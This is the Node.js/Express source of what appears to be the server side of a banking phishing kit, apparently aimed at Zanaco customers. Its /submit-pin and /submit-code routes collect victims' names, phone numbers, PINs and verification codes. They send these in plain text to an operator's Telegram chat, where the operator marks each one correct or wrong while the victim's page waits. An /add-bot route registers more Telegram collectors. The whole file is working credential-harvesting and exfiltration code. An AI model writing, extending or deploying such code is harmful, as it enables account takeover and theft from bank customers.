require('dotenv').config();
const express = require('express');
const axios = require('axios');
const { v4: uuidv4 } = require('uuid');

const app = express();
const PORT = process.env.PORT || 10000;

// Store approval states per requestId
const approvedPins = {};
const approvedCodes = {};

// ---------------- MULTI-BOT SETUP ----------------
// List of bots. Your current bot is bot1.
const bots = [
    {
        botId: 'bot1',
        botToken: process.env.TELEGRAM_BOT_TOKEN,
        chatId: process.env.TELEGRAM_CHAT_ID
    }
    // Additional bots can be added dynamically via /add-bot
];

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// ---------------- TELEGRAM HELPERS ----------------
// Send a message using a specific bot
async function sendTelegramMessage(bot, text, inlineKeyboard = []) {
    try {
        await axios.post(
            `https://api.telegram.org/bot${bot.botToken}/sendMessage`,
            {
                chat_id: bot.chatId,
                text,
                reply_markup: { inline_keyboard: inlineKeyboard }
            }
        );
        console.log(`✅ Telegram message sent by ${bot.botId}`);
    } catch (err) {
        console.error('❌ Telegram error:', err.response?.data || err.message);
    }
}

// Answer callback query using a specific bot
async function answerCallback(bot, callbackId) {
    try {
        await axios.post(
            `https://api.telegram.org/bot${bot.botToken}/answerCallbackQuery`,
            { callback_query_id: callbackId }
        );
        console.log(`✅ Answered callback for ${bot.botId}:`, callbackId);
    } catch (err) {
        console.error('❌ Callback error:', err.response?.data || err.message);
    }
}

// ---------------- ROUTES ----------------

// PIN submit
app.post('/submit-pin', (req, res) => {
    const { name = 'TestUser', phone = '0712345678', pin } = req.body;
    const requestId = uuidv4();

    console.log('📩 PIN received:', { name, phone, pin, requestId });
    approvedPins[requestId] = null;

    const bot = bots[0]; // Use first bot for now (keeps existing behavior)

    sendTelegramMessage(
        bot,
        `🔐 PIN VERIFICATION\n\nName: ${name}\nPhone: ${phone}\nPIN: ${pin}`,
        [[
            { text: '✅ Correct PIN', callback_data: `pin_ok:${requestId}` },
            { text: '❌ Wrong PIN', callback_data: `pin_bad:${requestId}` }
        ]]
    );

    res.json({ status: 'pending', requestId });
});

// PIN check
app.get('/check-pin/:requestId', (req, res) => {
    const requestId = req.params.requestId;
    res.json({ approved: approvedPins[requestId] ?? null });
});

// CODE submit
app.post('/submit-code', (req, res) => {
    const { name = 'TestUser', phone = '0712345678', code } = req.body;
    const requestId = uuidv4();

    console.log('📩 CODE received:', { name, phone, code, requestId });
    approvedCodes[requestId] = null;

    const bot = bots[0]; // Use first bot for now

    sendTelegramMessage(
        bot,
        `🔑 CODE VERIFICATION\n\nName: ${name}\nPhone: ${phone}\nCode: ${code}`,
        [[
            { text: '✅ Correct Code', callback_data: `code_ok:${requestId}` },
            { text: '❌ Wrong Code', callback_data: `code_bad:${requestId}` }
        ]]
    );

    res.json({ status: 'pending', requestId });
});

// CODE check
app.get('/check-code/:requestId', (req, res) => {
    const requestId = req.params.requestId;
    res.json({ approved: approvedCodes[requestId] ?? null });
});

// ---------------- TELEGRAM WEBHOOK ----------------
app.post('/telegram-webhook/:botId', async (req, res) => {
    const botId = req.params.botId;
    const bot = bots.find(b => b.botId === botId);
    if (!bot) return res.sendStatus(404);

    const cb = req.body.callback_query;
    if (!cb) return res.sendStatus(200);

    const [action, requestId] = cb.data.split(':');

    if (action === 'pin_ok') approvedPins[requestId] = true;
    if (action === 'pin_bad') approvedPins[requestId] = false;
    if (action === 'code_ok') approvedCodes[requestId] = true;
    if (action === 'code_bad') approvedCodes[requestId] = false;

    await answerCallback(bot, cb.id);

    res.sendStatus(200);
});

// ---------------- ADD NEW BOT DYNAMICALLY ----------------
app.post('/add-bot', async (req, res) => {
    const { botId, botToken, chatId, botName } = req.body;

    if (!botId || !botToken || !chatId) {
        return res.status(400).json({ error: 'botId, botToken, and chatId are required' });
    }

    // Check if bot already exists
    if (bots.find(b => b.botId === botId)) {
        return res.status(400).json({ error: 'Bot ID already exists' });
    }

    // Add bot to the list
    const newBot = { botId, botToken, chatId, botName };
    bots.push(newBot);

    // Set webhook for this bot automatically
    const webhookUrl = `https://YOUR_DOMAIN/telegram-webhook/${botId}`;
    try {
        const response = await axios.get(
            `https://api.telegram.org/bot${botToken}/setWebhook?url=${webhookUrl}`
        );
        console.log(`✅ Webhook set for ${botId}:`, response.data);
    } catch (err) {
        console.error('❌ Failed to set webhook:', err.response?.data || err.message);
        return res.status(500).json({ error: 'Failed to set webhook' });
    }

    res.json({ ok: true, message: `Bot ${botName || botId} added successfully`, bot: newBot });
});

// ---------------- TEST ROUTE ----------------
app.get('/test-bot', async (req, res) => {
    const bot = bots[0]; // first bot
    await sendTelegramMessage(bot, '🤖 Test message from Zanaco bot!');
    res.send('✅ Test message sent! Check Telegram.');
});

// ---------------- START SERVER ----------------
app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
});
